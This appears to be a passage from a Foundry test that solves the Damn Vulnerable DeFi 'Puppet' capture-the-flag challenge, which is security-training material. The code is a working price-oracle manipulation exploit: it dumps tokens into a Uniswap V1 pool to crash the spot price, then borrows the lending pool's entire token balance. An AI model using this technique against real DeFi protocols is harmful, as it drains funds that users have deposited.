...
contract Tx { constructor() payable {} }
...
contract PuppetChallenge is Test {
     ...
     */
        function test_puppet() public checkSolvedByPlayer {
            new Tx();
            // Approve Uniswap V1 exchange to withdraw all player's DVT
            uint256 playerTokens = token.balanceOf(player);
            token.approve(address(uniswapV1Exchange), playerTokens);

            // Dump all DVT → ETH to drop spot price in oracle
            uniswapV1Exchange.tokenToEthSwapInput(
                playerTokens,
                1,                // minimal 1 wei ETH agar tidak revert
                block.timestamp
            );

            // Calculate how much ETH collateral is needed after the price crashes
            uint256 poolTokens = token.balanceOf(address(lendingPool));
            uint256 requiredEth = lendingPool.calculateDepositRequired(poolTokens);

            // Borrow the entire token pool directly to recovery
            lendingPool.borrow{value: requiredEth}(
                poolTokens,
                recovery
            );
        }
